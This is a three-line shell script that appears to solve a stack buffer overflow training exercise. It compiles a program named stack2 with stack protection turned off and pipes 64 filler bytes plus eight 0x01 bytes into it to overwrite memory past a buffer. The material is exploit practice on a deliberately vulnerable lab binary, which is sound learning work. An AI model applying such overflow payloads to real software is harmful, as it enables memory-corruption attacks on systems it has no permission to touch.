#g++ -o stack2 stack2.c -g -Wall -fno-stack-protector
#!/bin/bash
echo `python -c 'print"A"*64+"\x01\x01\x01\x01\x01\x01\x01\x01"'` | ./stack2
